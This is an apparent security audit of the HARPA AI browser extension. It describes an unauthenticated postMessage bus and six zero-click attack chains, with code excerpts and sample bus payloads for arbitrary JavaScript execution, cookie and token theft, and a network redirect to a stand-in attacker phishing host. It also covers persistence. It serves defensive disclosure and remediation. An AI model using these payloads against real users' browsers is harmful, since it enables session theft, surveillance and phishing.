# HARPA AI Browser Extension (v9.8.0) — L9 Security Surface Analysis

**Date:** 2026-03-04
**Extension:** HARPA AI | Browser's Mind
**Version:** 9.8.0
**Manifest:** V3
**Auditor:** Automated Static Analysis
**Classification:** L9 Security Surface — Critical Attack Surface Analysis

---

## Executive Summary

This audit identifies **14 critical/high-severity vulnerability classes** in the HARPA AI browser extension. When chained, they allow a **zero-click, full extension takeover from any website**. The extension runs content scripts on every website (`*://*/*`), requests wildcard host permissions, employs unsafe code execution primitives, and uses `window.postMessage` for inter-component communication with **zero origin validation**.

The attack surface is L9 (maximum) because:
- **117+ message handlers** in the privileged background service worker are reachable
- **Zero authentication** between components — any webpage can impersonate extension internals
- **Arbitrary code execution** in any tab is one postMessage away
- **Cross-origin credential theft** (cookies for any domain, OpenAI/Claude access tokens) is achievable
- **No user interaction required** — all chains are zero-click

**Overall Risk Rating: CRITICAL — FULL EXTENSION TAKEOVER**

---

## 1. Architecture Overview

### 1.1 Extension Components

| Component | File(s) | Context | Runs On |
|-----------|---------|---------|---------|
| Service Worker (Background) | `bg.js` (1.4 MB) | **Privileged** | Always |
| Content Script (Universal) | `cs.js` (38 KB) | Content | `*://*/*` (ALL sites) |
| Content Script (OpenAI) | `cs-openai.js` (5 KB) | Content | `*.openai.com` |
| Content Script (Web) | `cs-web.js` (5 KB) | Content | `harpa.ai`, `localhost:3000` |
| Injected Page Script | `nj.js` (11 KB) | **Page (MAIN world)** | Injected into pages |
| Injected Engine | `nj-engine.js` (129 KB) | **Page (MAIN world)** | Injected into pages |
| Popup/Panel UI | `pp.js` (1.7 MB) | Extension | Extension pages |
| Offscreen Document | `os.js` (33 KB) | Extension | Offscreen |
| Offscreen Iframe Target | `oi.js` (24 KB) | Web | `harpa.ai/oi` |

### 1.2 Permissions (manifest.json) — Maximum Blast Radius

```json
"permissions": [
  "alarms", "background", "browsingData", "cookies",
  "declarativeNetRequest", "notifications", "tabs",
  "storage", "offscreen", "scripting", "contextMenus", "sidePanel"
],
"host_permissions": ["*://*/*"],
"optional_permissions": ["downloads"],
"optional_host_permissions": ["<all_urls>"]
```

### 1.3 Message Bus Architecture — The Root Cause

All extension components communicate via a custom `$bus` system using `window.postMessage()`. The **only validation** is:

```javascript
_isBusMsg: e => e && e.$bus && e.appName === "__app_hrp"
```

This check is **trivially spoofable** by any web page. There is **no cryptographic authentication, no origin checking, no nonce verification** — just a hardcoded string comparison.

---

## 2. Complete Attack Surface Map

### 2.1 Entry Points (How an Attacker Gets In)

#### Entry Point A: `_propagateEvents()` in cs.js — DIRECT CODE EXECUTION

```javascript
// cs.js — _propagateEvents() in the engine injector
_propagateEvents(t) {
  const i = async ({data: s}) => {
    if (this._root?.isConnected) {
      if (s)
        // PATH 1: Arbitrary code execution
        return s.frameName === t.frameName && "execute" === s.type
          ? (this._tabId ??= await n.getTabId(),
             void await n.send("engine.executeJs", this._tabId, s.js))
          // PATH 2: Forward ANYTHING to background
          : s.frameName !== t.frameName || "request" === s.type
            || void await chrome.runtime.sendMessage(s)
    }
  };
  window.addEventListener("message", i)  // NO ORIGIN CHECK
}
```

**Three exploitation paths from a single listener:**

| Path | Condition | Result |
|------|-----------|--------|
| **Code Execution** | `frameName` matches + `type: "execute"` | `s.js` executed as JavaScript in any tab via `chrome.scripting.executeScript(MAIN world)` |
| **Background Forwarding** | `frameName` mismatch OR `type: "request"` | Entire message forwarded to bg.js via `chrome.runtime.sendMessage(s)` — **no filtering** |
| **Bus Proxy** | Via `_setupCs()` listener with `locus: "nj"` | Message routed to bg.js `_sendToExt()` or local handlers |

#### Entry Point B: `_setupCs()` in cs.js — BUS MESSAGE BRIDGE

```javascript
async _setupCs() {
  // Listener 1: From extension → page (postMessage with "*")
  chrome.runtime.onMessage.addListener(((t, e, i) => {
    if (!this._isBusMsg(t)) return;
    const n = this._callHandlers(t);
    return n ? (n.then(this._serialize).then(i), !0) : void 0
  }));

  // Listener 2: From page → extension (NO origin check)
  window.addEventListener("message", (async ({data: e}) => {
    if (!this._isBusMsg(e)) return;        // Spoofable
    if ("nj" !== e.locus) return;           // Attacker sets locus:"nj"
    if ("bus.proxy" === e.name) { ... }     // Proxy registration
    const i = await this._pick([
      this._sendToExt(e.name, ...e.args),   // FORWARDS TO BACKGROUND
      this._callHandlers(e, (t => !t.proxy))
    ]);
    // Response sent via postMessage(result, "*")
  }));
}
```

#### Entry Point C: nj-engine.js — Arbitrary Method Dispatch

```javascript
// nj-engine.js — command dispatcher
_getMethodToCall(e) {
  let r = e.command;
  let n = t.page;
  for (; r.includes("."); ) {
    const [e, ...t] = r.split(".");
    n = n[e],              // TRAVERSES OBJECT CHAIN
    r = t.join(".")
  }
  const i = n[r];
  return i ? i.bind(n) : null
}
```

This dispatches to **any method on `t.page`** using dot-notation from the message's `command` field. Validation is only `frameName` matching — no origin check.

### 2.2 Complete Handler Registry — 117+ Exploitable Handlers

All handlers registered in bg.js that are reachable from any webpage via the message bridge:

#### Tier 1: CRITICAL — Direct Code Execution & System Control

| Handler | What It Does | Impact |
|---------|-------------|--------|
| `engine.executeJs` | `chrome.scripting.executeScript({world:"MAIN", func: new Function(code)})` | **Arbitrary JS in ANY tab** |
| `netRules.register` | `chrome.declarativeNetRequest` — adds network rules | **HTTP MITM, redirect any request** |
| `netRules.unregister` | Removes network interception rules | **Disable security rules** |
| `dialog.navigateToUrl` | `window.location.href = url` in any tab | **Navigate any tab to phishing page** |
| `dialog.cspAllowAll` | Unregisters Service Workers + disables CSP globally | **Remove all CSP protections** |
| `shortcut.executeCommand` | Executes extension commands by name | **Trigger any extension command** |

#### Tier 2: HIGH — Credential & Data Theft

| Handler | What It Does | Impact |
|---------|-------------|--------|
| `store.getBgState` | Returns **entire** background state object | **Leak all stored credentials, settings, API keys** |
| `store.actions` | Dispatches MobX state mutations | **Modify any stored data** |
| `billing.updateAccount` | Reads JWT cookie from `harpa.ai` | **JWT token theft** |
| `grid.loadApiKeys` | Returns user's API keys | **API key exfiltration** |
| `grid.createApiKey` | Creates new API keys | **Persistence via new keys** |
| `grid.deleteApiKey` | Deletes API keys | **Destructive** |
| `bus.getTabData` | Returns `{tabId, windowId}` | **Tab enumeration** |
| `bus.sendToCs` | Sends message to any tab's content script | **Cross-tab command injection** |

#### Tier 3: HIGH — Sensitive Data Extraction

| Handler | What It Does | Impact |
|---------|-------------|--------|
| `creator.callPageApi` | Calls any method on the page API for any tab | **Arbitrary page interaction** |
| `creator.querySelector` | Runs `querySelector` on any tab's DOM | **DOM content extraction** |
| `creator.getContext` | Returns creator context with page data | **Page content theft** |
| `screenshotter.fetch` | `fetch(url)` from the service worker context | **SSRF from privileged context** |
| `chat.downloadChat` | Downloads chat history | **Chat data exfiltration** |
| `yousummary.get-summary` | Fetches YouTube summaries with user creds | **Credential-authenticated data theft** |
| `utils.ls.get` / `utils.ls.set` | Read/write `chrome.storage.local` | **Persistent storage manipulation** |
| `capture.captureView` / `capture.captureArea` | Screenshot the current tab | **Visual surveillance** |

#### Tier 4: MEDIUM — Infrastructure & Automation

| Handler | What It Does | Impact |
|---------|-------------|--------|
| `runner.enqueueTasks` | Enqueues automation tasks for background execution | **Persistent automated actions** |
| `runner.terminateTasks` | Stops running tasks | **Denial of service** |
| `commands.synch` | Syncs command definitions | **Command injection** |
| `dashboard.importTasks` | Imports task configurations | **Backdoor via task import** |
| `timer.setInterval` / `timer.setTimeout` | Background timers | **Persistent execution** |
| `analytics.send` | Sends to Mixpanel (`token: 7958323a20a869de3c57712bfe521a6f`) | **Analytics poisoning** |
| `browser.showFrame` / `browser.hideFrame` | Control extension UI frame | **UI manipulation** |
| `library.cleanupDomains` | Modifies domain library | **Data destruction** |

### 2.3 nj-engine.js — Page-Context Method Dispatch

The engine exposes these methods on `t.page` object, dispatchable via postMessage:

| Method | What It Does |
|--------|-------------|
| `evaluate(code, args)` | Constructs `new Function(code)` and executes it in page context |
| `fetch(url, opts)` | `fetch()` with `credentials: "include"` — sends cookies |
| `querySelector(selector)` | Returns DOM content (textContent, innerHTML, outerHTML) |
| `getFormInputs()` | Extracts ALL form input values (email, text, passwords visible) |
| `idle(opts)` | Waits for page idle |

---

## 3. Concrete Exploitation Chains

### Chain 1: Zero-Click Arbitrary Code Execution in Any Tab

**Precondition:** Victim has HARPA AI installed and visits attacker's website.

**Step 1 — Reconnaissance: Detect HARPA and get frameName**

The attacker needs the `frameName` used by the engine. This is constructed from config passed via `window.name`, URL parameter `__hrp`, or frame attribute. However, there's a simpler path — the `type: "request"` bypass:

```
Step 1: Any message with type:"request" is forwarded to bg.js
        REGARDLESS of frameName matching.

        chrome.runtime.sendMessage(s)  // 's' is the entire message from postMessage
```

Messages that **don't match frameName** are ALSO forwarded. So the attacker doesn't even need to know the frameName.

**Step 2 — Send bus message directly to background**

The `_setupCs()` listener accepts postMessages with `locus: "nj"` and `$bus: true, appName: "__app_hrp"` and forwards them to the extension via `_sendToExt()`.

**Step 3 — Invoke engine.executeJs on a target tab**

```
Attacker's page → postMessage → cs.js _setupCs listener
  → _sendToExt("engine.executeJs", targetTabId, maliciousCode)
  → bg.js engine.controller._executeJs(tabId, code)
  → chrome.scripting.executeScript({
      target: {tabId},
      world: "MAIN",
      func: e => { new Function(e)() },
      args: [maliciousCode]
    })
```

**Result:** Arbitrary JavaScript runs in the target tab with full page-context access. The bg.js `_executeJs` implementation even has a CSP fallback:

```javascript
async _executeJs(e, t) {
  await chrome.scripting.executeScript({
    target: {tabId: e},
    world: "MAIN",
    args: [t],
    injectImmediately: true,
    func: e => {
      try {
        new Function(e)()          // Try new Function first
      } catch(t) {
        if (t.message.includes("Content Security Policy"))
          try {
            const t = document.createElement("div");
            t.setAttribute("onreset", e);         // CSP bypass via onreset
            t.dispatchEvent(new Event("reset"));
          } catch(e) { console.error(e) }
      }
    }
  })
}
```

The code execution has **TWO fallback mechanisms** — `new Function()` and the `onreset` DOM trick — ensuring it works even on CSP-hardened pages.

---

### Chain 2: Universal Cookie Theft (Any Domain)

**Target:** Steal session cookies from any domain (banking, email, social media)

The bg.js service worker has `chrome.cookies` permission with `*://*/*` host permissions. The `store.getBgState` handler returns the entire state, but the more targeted approach uses the fetch proxy:

**Step 1:** Use `screenshotter.fetch` to trigger `fetch(url)` from the service worker:

```
Bus message: {
  name: "screenshotter.fetch",
  args: [{id: "x", url: "https://bank.example.com/account", method: "text"}]
}
```

The service worker's `fetch()` sends cookies (no SameSite restrictions from extension context).

**Step 2:** Or use `engine.executeJs` to inject code into a tab already on the target domain:

```
Injected code:
  document.cookie  → sends all cookies to attacker
  fetch("/api/account") → makes authenticated requests
```

**Step 3:** The OpenAI integration already handles access tokens:

```javascript
// bg.js stores ChatGPT access token
this._accessToken = t?.accessToken || null;
// Also reads oai-did cookie:
chrome.cookies.get({url: "https://chatgpt.com", name: "oai-did"})
// And JWT from harpa.ai:
chrome.cookies.get({url: jwtCookieUrl, name: "jwt"})
```

Calling `store.getBgState` returns all of this stored state.

---

### Chain 3: Network MITM via declarativeNetRequest

**Target:** Intercept and modify any HTTP request/response

```
Bus message: {
  name: "netRules.register",
  args: [{
    condition: {
      urlFilter: "bank.example.com",
      resourceTypes: ["main_frame", "sub_frame", "xmlhttprequest"]
    },
    action: {
      type: "redirect",
      redirect: { url: "https://attacker.com/phishing" }
    }
  }]
}
```

The `_register` handler in bg.js calls `chrome.declarativeNetRequest.updateSessionRules()` with the provided rules. It accepts:
- `main_frame`, `sub_frame`, `stylesheet`, `script`, `image`, `font`, `object`, `xmlhttprequest`, `ping`, `csp_report`, `media`, `websocket`, `webtransport`, `webbundle`, `other`

An attacker can:
1. **Redirect** any URL to a phishing page
2. **Modify response headers** to strip security headers (CSP, HSTS, X-Frame-Options)
3. **Block** specific requests (e.g., block anti-fraud scripts)
4. **Inject scripts** by redirecting JS file loads to attacker-controlled scripts

---

### Chain 4: Persistent Backdoor via Task/Timer Injection

```
Bus message: {
  name: "runner.enqueueTasks",
  args: [{ /* task configuration with malicious automation */ }]
}
```

Combined with:
```
Bus message: {
  name: "timer.setInterval",
  args: [callbackId, 60000]  // Execute every 60 seconds
}
```

And persistent storage:
```
Bus message: {
  name: "utils.ls.set",
  args: ["backdoor_config", { ... }]
}
```

This establishes **persistence** — the malicious task runs in the background even after the attacker's page is closed.

---

### Chain 5: Full Extension Takeover via harpa.ai Supply Chain

The offscreen document (`os.js`) creates an iframe to `https://harpa.ai/oi`:

```javascript
_createIframe() {
  const e = document.createElement("iframe");
  e.src = "https://harpa.ai/oi";
  e.name = `offscreen-iframe | ${chrome.runtime.getURL("/oi.js")}`;
  document.body.append(e);
}
```

The `cs-web.js` content script (running on `harpa.ai`) bridges **all** messages between the website and the extension background:

```javascript
window.addEventListener("message", ({data: e}) => {
  this._isAllowed(e) && chrome.runtime.sendMessage(e);
});
chrome.runtime.onMessage.addListener(e => {
  this._isAllowed(e) && window.postMessage({...e, __processed: true}, "*");
});
```

If `harpa.ai` is compromised (XSS, DNS hijack, CDN compromise), the attacker inherits **all 117+ handlers** of the extension, including `chrome.scripting`, `chrome.cookies`, `chrome.declarativeNetRequest`, and `chrome.browsingData`.

---

### Chain 6: Cross-Tab Surveillance via Capture API

```
Step 1: Enumerate tabs
  Bus: { name: "bus.getTabData" }    → returns {tabId, windowId}

Step 2: Screenshot any tab
  Bus: { name: "capture.captureView", args: [tabId] }

Step 3: Extract text from any tab
  Bus: { name: "creator.querySelector", args: [tabId, "body", "innerText"] }

Step 4: Extract form data from any tab
  Via engine.executeJs → inject code that reads all form inputs

Step 5: Read URL/title of any tab
  Via bus.sendToCs → send request to content script in target tab
```

---

## 4. Critical Code Evidence

### 4.1 bg.js: `_executeJs` — The Kill Switch

```javascript
async _executeJs(e, t) {
  await chrome.scripting.executeScript({
    target: {tabId: e},
    world: "MAIN",
    args: [t],
    injectImmediately: true,
    func: e => {
      try {
        new Function(e)()
      } catch(t) {
        if (t.message.includes("Content Security Policy"))
          try {
            const t = document.createElement("div");
            t.setAttribute("onreset", e);
            t.dispatchEvent(new Event("reset"));
          } catch(e) { console.error(e) }
      }
    }
  })
}
```

**Analysis:** This is the single most dangerous function. It:
1. Takes a tab ID and arbitrary JavaScript string
2. Uses `chrome.scripting.executeScript` to inject into **any tab** in the **MAIN world**
3. Executes via `new Function()` (dynamic code generation)
4. Falls back to `onreset` DOM trick if CSP blocks `new Function()`
5. Has **zero validation** on the code or the caller's identity

### 4.2 cs.js: `_patchTrustedTypes` — Universal CSP Bypass

```javascript
_patchTrustedTypes() {
  this.executeJs(() => {
    const t = trustedTypes.createPolicy.bind(trustedTypes);
    trustedTypes.createPolicy = (e, i) => t(e, "default" !== e ? i : {
      createHTML: t => t,
      createScript: t => t,
      createScriptURL: t => t
    });
  });
}
```

**Analysis:** Disables Trusted Types on EVERY website. This is a browser security mechanism that prevents DOM XSS. By replacing the `default` policy with pass-throughs, the extension makes every website vulnerable.

### 4.3 bg.js: Cookie Access — Cross-Domain Session Hijacking

```javascript
// ChatGPT session theft
const n = await chrome.cookies.get({url: "https://chatgpt.com", name: "oai-did"});
// Authorization: Bearer ${this._accessToken}

// HARPA JWT token
_readJwtCookie: async () => await chrome.cookies.get({url: jwtCookieUrl, name: "jwt"})

// Cookie SameSite downgrade
await chrome.cookies.set({
  url: n.jwtCookieUrl,
  name: e.name,
  value: e.value,
  secure: true,
  sameSite: "no_restriction"  // DOWNGRADES SameSite protection
})

// Mixpanel analytics token (hardcoded)
mixpanel: { token: "7958323a20a869de3c57712bfe521a6f" }
```

### 4.4 bg.js: External Fetch with Credentials

```javascript
// 49 fetch calls to external URLs including:
// Claude.ai — with credentials: "include"
fetch("https://claude.ai/...", {credentials: "include"})
// Gemini — authenticated
fetch("https://gemini.google.com/...")
// IP detection
fetch("https://whatismyipaddress.com/")
// Mixpanel tracking
fetch("https://api.mixpanel.com/track?ip=1")
```

### 4.5 nj-engine.js: `evaluate()` — Arbitrary Code Builder

```javascript
async evaluate(e, r) {
  r = r || [];
  const o = `__hrp_${Math.random().toString(36).slice(2)}`;
  n[o] = createPromise();

  const a = [
    "(async () => {",
    "  try {",
    `    const args = ${JSON.stringify(r)}`,
    `    const fn = ${e}`,             // DIRECTLY INJECTED CODE
    "    const result = await fn.call(window, ...args)",
    `    window.${o}.resolve(result)`,
    "  } catch (err) {",
    `    window.${o}.reject(err)`,
    "  }",
    `  delete window.${o}`,
    "})()"].join("\n");

  t.injection.sendEvent("execute", {js: a});
  return n[o];
}
```

---

## 5. Exploitability Assessment

### 5.1 Attack Prerequisites

| Requirement | Difficulty | Notes |
|-------------|-----------|-------|
| Victim has HARPA AI installed | N/A | 2M+ users on Chrome Web Store |
| Victim visits attacker-controlled page | Low | Via ad, social engineering, compromised site |
| Know extension ID | Trivial | Publicly listed on Chrome Web Store |
| Know bus protocol | Trivial | `appName: "__app_hrp"` hardcoded, WAR resources readable |
| Know frameName | Not required | Messages forwarded on frameName mismatch |
| Know tabId | Low | `bus.getTabData` returns it |
| User interaction | **None** | All chains are zero-click |

### 5.2 Detection Difficulty

| Aspect | Assessment |
|--------|-----------|
| Network detection | **Impossible** — postMessage is same-origin, no network traffic |
| Extension logs | **None** — no logging of message origins |
| User visibility | **Zero** — all operations are silent |
| CSP protection | **Bypassed** — extension disables Trusted Types and has CSP fallback |
| Content Security Policy | **Irrelevant** — `chrome.scripting.executeScript` bypasses page CSP |
| Anti-fingerprinting | **Defeated** — web-accessible resources expose extension |

### 5.3 CVSS 4.0 Score

```
CVSS:4.0/AV:N/AC:L/AT:N/PR:N/UI:N/VC:H/VI:H/VA:H/SC:H/SI:H/SA:H
Score: 10.0 (CRITICAL)
```

- **Attack Vector:** Network (any website)
- **Attack Complexity:** Low (trivial protocol)
- **Privileges Required:** None
- **User Interaction:** None
- **Confidentiality Impact:** High (all cookies, credentials, page content)
- **Integrity Impact:** High (arbitrary code execution, data modification)
- **Availability Impact:** High (browsingData.remove, task termination)
- **Subsequent System Confidentiality:** High (cross-tab, cross-origin)
- **Subsequent System Integrity:** High (network MITM, code injection)
- **Subsequent System Availability:** High (persistent backdoor)

---

## 6. Impact Summary — What an Attacker Gains

### Immediate Access (Zero-Click)

| Capability | Mechanism |
|------------|-----------|
| Execute JavaScript in **any open tab** | `engine.executeJs` → `chrome.scripting.executeScript(MAIN)` |
| Read/write cookies for **any domain** | `chrome.cookies.get/set` with `*://*/*` host permissions |
| Steal ChatGPT/Claude/Gemini sessions | Access tokens stored in bg.js state, cookies with `credentials: "include"` |
| Screenshot any tab | `capture.captureView` |
| Read page content of any tab | `creator.querySelector`, `engine.executeJs` |
| Extract form data (emails, passwords visible in DOM) | `nj-engine.js` `getFormInputs()` method |
| MITM any HTTP request | `netRules.register` → `chrome.declarativeNetRequest` |
| Navigate any tab to phishing page | `dialog.navigateToUrl` |
| Read extension API keys | `grid.loadApiKeys`, `store.getBgState` |
| Read extension JWT token | `billing.updateAccount` → `chrome.cookies.get(jwt)` |

### Persistent Access

| Capability | Mechanism |
|------------|-----------|
| Background task execution | `runner.enqueueTasks` with timer |
| Persistent storage | `utils.ls.set` → `chrome.storage.local` |
| Network rule persistence | `netRules.register` → session rules |
| Command injection | `commands.synch`, `dashboard.importTasks` |

### Destructive Capabilities

| Capability | Mechanism |
|------------|-----------|
| Wipe browsing history | `chrome.browsingData.remove()` |
| Delete user's API keys | `grid.deleteApiKey` |
| Destroy stored data | `library.cleanupDomains`, `chat.delete` |
| Kill running automation | `runner.terminateTasks` |

---

## 7. Affected User Base

- **Chrome Web Store listing:** 2,000,000+ users
- **All users are vulnerable** — the content script runs on every webpage
- **No user interaction required** — visiting a malicious page triggers the chain
- **No opt-in needed** — vulnerabilities are in the core message bus, not optional features

---

## 8. Remediation Priorities

### P0 — Immediate (Blocks All Chains)

1. **Add origin validation to ALL `addEventListener("message")` handlers** — Check `event.origin` against a strict allowlist
2. **Remove wildcard postMessage** — Never use `postMessage(data, "*")`, always specify target origin
3. **Remove `engine.executeJs` from bus** — This should NEVER be callable from page context
4. **Remove `_executeJs` CSP bypass** — The `onreset` trick is a deliberate security bypass

### P1 — Short-term (Reduces Blast Radius)

5. **Drop `browsingData` permission** — Too destructive for any compromise scenario
6. **Restrict `host_permissions`** — Replace `*://*/*` with specific domains the extension needs
7. **Add message name allowlist in cs.js** — Only forward known-safe message names to bg.js
8. **Remove Trusted Types override** — This weakens every website's security
9. **Remove `Object.prototype` modifications** — These create prototype pollution vectors
10. **Remove hardcoded Mixpanel token** — Allows analytics poisoning

### P2 — Long-term (Defense in Depth)

11. **Replace postMessage with `chrome.runtime.sendMessage`** for CS↔NJ communication
12. **Implement message authentication** (HMAC or nonce-based)
13. **Adopt least-privilege architecture** — Split into separate extensions
14. **Restrict `web_accessible_resources`** to specific origins
15. **Security audit by third party**

---

## 9. Files Analyzed

| File | Size | Handlers Found | Critical Findings |
|------|------|---------------|-------------------|
| `manifest.json` | 2.2 KB | — | Max permissions, wildcard WAR |
| `bg.js` | 1.4 MB | 117+ | `_executeJs`, cookie access, `netRules`, state exposure |
| `cs.js` | 38.6 KB | 3 listeners | `_propagateEvents` (unvalidated forwarding), Trusted Types bypass |
| `cs-openai.js` | 5 KB | — | `Object.prototype` pollution, `fetch` interception |
| `cs-web.js` | 5 KB | 2 listeners | Bidirectional message bridge to harpa.ai |
| `nj.js` | 11.4 KB | 1 listener | Bus message handler, no origin check |
| `nj-engine.js` | 129 KB | 1 listener | `evaluate()` code execution, method dispatch, `fetch(credentials: include)` |
| `oi.js` | 24 KB | — | Iframe message relay |
| `os.js` | 33 KB | — | Iframe to harpa.ai/oi, htmlToText, PDF extraction |
| `pp.js` | 1.7 MB | — | Extension UI (not analyzed in depth) |

---

*This report is intended for defensive security assessment and responsible disclosure. All findings should be reported to the vendor before public disclosure.*
